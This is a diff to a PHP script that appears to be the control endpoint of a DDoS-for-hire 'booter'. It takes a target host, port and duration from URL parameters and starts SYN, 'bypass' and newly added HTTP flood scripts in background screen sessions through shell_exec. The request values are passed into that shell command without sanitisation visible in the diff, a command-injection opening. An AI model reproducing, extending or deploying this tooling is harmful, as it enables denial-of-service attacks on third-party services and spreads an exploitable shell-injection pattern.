@@ -13,7 +13,7 @@ if (file_exists('version.txt')) {
     if (version_compare($remote_version, $current_version) > 0) {
         $update = true;
     } else if (version_compare($remote_version, $current_version) < 0) {
-        die("Remote version: $remote_version<br>Current version: $current_version<br>Local version corrupted. Forcing update.<br>");
+        die("Local version corrupted. Forcing update.<br>");
         $update = true;
     }
 } else {
@@ -31,9 +31,10 @@ $port = intval($_GET['port']);
 $time = intval($_GET['time']);
 $method = $_GET['method'];
 $action = $_GET['action'];
+$debug = isset($_GET['debug']) ? 1 : 0;
 
 $directory = "REPLACEME";
-$array = array("syn", "synpy", "bypass", "stop");
+$array = array("syn", "bypass", "http", "stop", "update");
 $ray = array("b387c979321e6360bc9a3a28fe83eb76");
 
 
@@ -89,18 +90,25 @@ if ($port > 44405) {
 //     die('Error: Port is not in numeric form!');
 // }
 
+$command = "";
+
 if ($method == "syn") {
     $command = "screen -dm perl $directory/syn.pl $host $port 55000 $time";
 }
-if ($method == "synpy") {
-    $command = "screen -dm python $directory/syn.py $host $port 55000 $time";
-}
 if ($method == "bypass") {
     $command = "screen -dm perl $directory/bypass.pl $host $time";
+}
+if ($method == "http") {
+    $command = "screen -dm perl $directory/http.pl $host $port 50 500 $time";
 }
 if ($method == "stop") {
     $command = "pkill $host -f";
 }
 
 $output = shell_exec($command . " 2>&1");
-die(nl2br("Output:\n$output\nCommand executed:\n$command"));
+if ($debug)
+    die(nl2br("Output:\n$output\nCommand executed:\n$command"));
+else {
+    if (empty($output)) die('ok');
+    else die($output);
+}
